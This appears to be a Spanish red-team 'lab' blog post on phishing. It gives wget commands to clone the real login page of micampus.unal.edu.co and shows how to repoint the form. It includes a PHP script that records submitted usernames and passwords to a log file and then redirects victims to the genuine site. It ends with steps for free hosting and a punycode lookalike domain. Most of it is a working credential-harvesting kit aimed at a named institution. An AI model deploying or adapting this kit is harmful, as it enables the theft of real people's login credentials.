---
title: Laboratorio de pishing
author: FredyRosero
tags: 
 - laboratorio
 - pishing
 - redteam
categories: [laboratorios]
---
# Laboratorio de pishing
Abstract.
 <!--more-->

## Prerrequisitos
```bash
sudo apt install
```

## Método manual
Esto es manual
### WGet
-E
--adjust-extension
> If a file of type application/xhtml+xml or text/html is downloaded and the URL does not end with the regexp \.[Hh][Tt][Mm][Ll]?, this option will cause the suffix .html to be appended to the local filename.

-H
--span-hosts
> Enable spanning across hosts when doing recursive retrieving. 

-k
--convert-links
> After the download is complete, convert the links in the document to make them suitable for local  viewing.

-K
--backup-converted
> When converting a file, back up the original version with a .orig suffix. Affects the behavior of -N. 
-p
--page-requisites
> This option causes Wget to download all the files that are necessary to properly display a given HTML page.

-nH
--no-host-directories
> Disable generation of host-prefixed directories.

#### Descarga de página
```bash
URL=https://micampus.unal.edu.co/
USER_AGENT='"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/60.0"'
WEB_PATH=$(pwd)/web
wget -E -H -k -K -p -nH --cut-dirs=100 -nv $URL --user-agent $USER_AGENT --directory-prefix=$WEB_PATH
```
### Index.html
Vamos a copiar el archivo `index.html`
```bash
cd web
cp index.html index.html.bkp
vim index.html
# :q
```

Luego lo formateamos con [tidy](https://www.html-tidy.org/)
```bash
tidy -indent --indent-spaces 2 --quiet --tidy-mark no index.html.bkp > index.html
```

Ahora buscamos el formulario de login y cambiamos su atributo [`action`](https://developer.mozilla.org/es/docs/Web/HTML/Element/form#attr-action) a `pish.hp` el cual será la URI del programa que procesará la información enviada por medio del formulario.
```bash
vim index.html
# q/i action=
# vi"c
# phish.php
# :w
```

Tambien identificamos el atributo `name` de los inputs del mismo formulario
```bash
# q/i name=
# :q
```

Ahora creamos el archivo `phish.php` con el comando `vim phish.php`, pegamos y el siguiente contenido y salimos con `:wq`
```php
<?php
// Extraer Form data
$form_data = file_get_contents('php://input'); // Guardar cuerpo de la petición en un string
parse_str($form_data, $parsed); // Parsea un string a variables

// Construimos el mensaje a guardar
$log = "=============+=============\n";
$log .= "Username:	" . $parsed['username'] . "\n";
$log .= "Password:	" . $parsed['password'] . "\n";
$log .= "===========================\n\n\n";

// Escribimos en el archivo `log`
$logpath = "log";
$file = fopen($logpath, 'a'); // la opción a (de append) permite abrir para agregar
fwrite($file, $log);
fclose($file);

// redirection link will be set automatically
$URL = "https://micampus.unal.edu.co/";
header("Location: ${URL}");
?>
```

Lanzamos el servidor web standalond de php con
```bash
php -S 0.0.0.0:8081
```
### Servidor web
1. Solicitamos un hosting grauito en 000webhost.com
1. Definimos el dominio p. ej. *i❤️uqbar.ml*
1. Traducimos la url a punycode en [punycoder](https://www.punycoder.com/) p. ej. *xn--iuqbar-i50d.ml*
1. Creamos un dominio en freenom.com y asignamos la redirección o registro DNS p. ej. *http://test-uqbar.000webhostapp.com/*. Esto implica verificar el correo



